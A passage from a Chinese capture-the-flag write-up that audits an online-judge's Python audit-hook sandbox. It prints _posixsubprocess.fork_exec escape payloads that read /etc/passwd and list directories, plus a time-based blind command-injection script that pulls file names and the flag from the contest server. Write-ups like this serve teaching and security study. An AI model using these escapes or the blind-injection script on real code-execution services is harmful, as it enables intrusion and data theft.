+</span></span><span class="line"><span class="cl">            <span class="n">expected_output_file</span> <span class="o">=</span> <span class="n">problem_dir</span> <span class="o">/</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">test_file</span><span class="o">.</span><span class="n">stem</span><span class="si">}</span><span class="s2">.output&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">expected_output_file</span><span class="o">.</span><span class="n">exists</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">case_passed</span> <span class="o">=</span> <span class="n">run_code</span><span class="p">(</span><span class="n">code_filename</span><span class="p">,</span> <span class="n">input_file</span><span class="p">,</span> <span class="n">expected_output_file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">case_passed</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">passed_tests</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">passed_tests</span> <span class="o">==</span> <span class="n">total_tests</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;AC&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;Accepted&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;WA&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;Wrang Answer: pass(</span><span class="si">{</span><span class="n">passed_tests</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">total_tests</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">OJRuntimeError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;RE&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;Runtime Error: ret=</span><span class="si">{</span><span class="n">e</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">OJTimeLimitExceed</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;TLE&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Time Limit Exceed&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">run_code</span><span class="p">(</span><span class="n">code_filename</span><span class="p">,</span> <span class="n">input_file</span><span class="p">,</span> <span class="n">expected_output_file</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">infile</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">expected_output_file</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">as</span> <span class="n">expected_output</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">expected_output_content</span> <span class="o">=</span> <span class="n">expected_output</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="p">[</span><span class="s2">&#34;python3&#34;</span><span class="p">,</span> <span class="n">code_filename</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="n">stdin</span><span class="o">=</span><span class="n">infile</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">communicate</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">TimeoutExpired</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">process</span><span class="o">.</span><span class="n">kill</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="n">OJTimeLimitExceed</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">process</span><span class="o">.</span><span class="n">returncode</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="n">OJRuntimeError</span><span class="p">(</span><span class="n">process</span><span class="o">.</span><span class="n">returncode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">stdout</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="n">expected_output_content</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>审计代码，关键代码就是传参，然后可以往python文件写python代码，但是设置了audit沙箱，简单说几个关键代码，写入文件的代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">CODE_TEMPLATE</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">import sys
+</span></span></span><span class="line"><span class="cl"><span class="s2">import math
+</span></span></span><span class="line"><span class="cl"><span class="s2">import collections
+</span></span></span><span class="line"><span class="cl"><span class="s2">import queue
+</span></span></span><span class="line"><span class="cl"><span class="s2">import heapq
+</span></span></span><span class="line"><span class="cl"><span class="s2">import bisect
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">def audit_checker(event,args):
+</span></span></span><span class="line"><span class="cl"><span class="s2">    if not event in [&#34;import&#34;,&#34;time.sleep&#34;,&#34;builtins.input&#34;,&#34;builtins.input/result&#34;]:
+</span></span></span><span class="line"><span class="cl"><span class="s2">        raise RuntimeError
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">sys.addaudithook(audit_checker)
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">。。。。。。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">code_filename</span> <span class="o">=</span> <span class="n">SUBMISSIONS_PATH</span> <span class="o">/</span> <span class="sa">f</span><span class="s2">&#34;submission_</span><span class="si">{</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="si">}</span><span class="s2">.py&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">code_filename</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">code_file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">code</span> <span class="o">=</span> <span class="n">CODE_TEMPLATE</span> <span class="o">+</span> <span class="n">code</span>
+</span></span><span class="line"><span class="cl">            <span class="n">code_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里就是从post传参来获取到code的值，让然后拼接CODE_TEMPLATE写入到一个python文件。</p>
+<p>运行python文件代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"> <span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="p">[</span><span class="s2">&#34;python3&#34;</span><span class="p">,</span> <span class="n">code_filename</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="n">stdin</span><span class="o">=</span><span class="n">infile</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">communicate</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>就是执行python文件。可以进行对python文件内容进行代码注入，看拼接的代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">CODE_TEMPLATE</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">import sys
+</span></span></span><span class="line"><span class="cl"><span class="s2">import math
+</span></span></span><span class="line"><span class="cl"><span class="s2">import collections
+</span></span></span><span class="line"><span class="cl"><span class="s2">import queue
+</span></span></span><span class="line"><span class="cl"><span class="s2">import heapq
+</span></span></span><span class="line"><span class="cl"><span class="s2">import bisect
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">def audit_checker(event,args):
+</span></span></span><span class="line"><span class="cl"><span class="s2">    if not event in [&#34;import&#34;,&#34;time.sleep&#34;,&#34;builtins.input&#34;,&#34;builtins.input/result&#34;]:
+</span></span></span><span class="line"><span class="cl"><span class="s2">        raise RuntimeError
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">sys.addaudithook(audit_checker)
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>audit hook沙箱，就是限制了sys对进程的一些加载以及利用。可以看到是允许import操作，以及time模块的sleep方法等，这里就是audithook沙箱，可以打沙箱逃逸，在audit沙箱逃逸中，非常经典的就是使用fok_exec()函数，即利用<code>_posixsubprocess</code>模块，这个模块就是创建了一个子进程，可以进行命令执行，一个简单的payload如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">_posixsubprocess</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">_posixsubprocess</span><span class="o">.</span><span class="n">fork_exec</span><span class="p">([</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="s2">&#34;cat /etc/passwd&#34;</span><span class="p">],</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">],</span> <span class="kc">True</span><span class="p">,</span> <span class="p">(),</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">pipe</span><span class="p">()),</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span><span class="kc">False</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以本地测试一下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">collections</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">queue</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">heapq</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">bisect</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">audit_checker</span><span class="p">(</span><span class="n">event</span><span class="p">,</span><span class="n">args</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">event</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;import&#34;</span><span class="p">,</span><span class="s2">&#34;time.sleep&#34;</span><span class="p">,</span><span class="s2">&#34;builtins.input&#34;</span><span class="p">,</span><span class="s2">&#34;builtins.input/result&#34;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">RuntimeError</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">addaudithook</span><span class="p">(</span><span class="n">audit_checker</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">_posixsubprocess</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">_posixsubprocess</span><span class="o">.</span><span class="n">fork_exec</span><span class="p">([</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="s2">&#34;ls /&#34;</span><span class="p">],</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">],</span> <span class="kc">True</span><span class="p">,</span> <span class="p">(),</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">pipe</span><span class="p">()),</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span><span class="kc">False</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行效果如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502231444825.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250223144443767"
+	
+	
+></p>
+<p>成功命令执行。</p>
+<p>但是现在就需要想在题目中怎么利用。</p>
+<p>题目描述说了环境不出网。那就打命令盲注。参考到之前的脚本稍微改改：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://121.41.238.106:13847/api/submit&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">charset</span> <span class="o">=</span> <span class="s2">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="si">{}</span><span class="s2">-&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">):</span>  <span class="c1"># 假设有 4 行</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;第</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">行&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">):</span>  <span class="c1"># 假设每行最多 7个字符</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">:</span>  <span class="c1"># 限制字符范围为字母和数字</span>
+</span></span><span class="line"><span class="cl">            <span class="n">json_data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;problem_id&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;code&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;import os
+</span></span></span><span class="line"><span class="cl"><span class="s1">import _posixsubprocess
+</span></span></span><span class="line"><span class="cl"><span class="s1">_posixsubprocess.fork_exec([&#34;/bin/sh&#34;, &#34;-c&#34;, &#34;if [ $(ls / | awk NR==</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1"> | cut -c </span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s1">) = &#39;</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s1">&#39; ];then sleep 2; fi&#34;], [b&#34;/bin/sh&#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, False, None, None, None, -1, None, False)
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">json_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                <span class="n">delay</span> <span class="o">=</span> <span class="n">end_time</span> <span class="o">-</span> <span class="n">start_time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">delay</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">result</span> <span class="o">+=</span> <span class="n">char</span>
+</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;当前结果: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;请求失败: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="s2">&#34; &#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;最终结果:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>就是有点慢，一直等着跑：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502231558052.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250223155809994"
+	
+	
+></p>
+<p>还没跑出来flag文件名称，简单改一下<code>i</code>的范围即可，然后继续跑，跑出来一个flag-9的名称：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502231616268.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250223161600230"
+	
+	
+></p>
+<p>直接用通配符<code>*</code>匹配然后读取内容，注意将j的值改大点，简单改改就行了：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>  <span class="c1"># 假设有 4 行</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;第</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">行&#34;</span><span class="p">)</span>
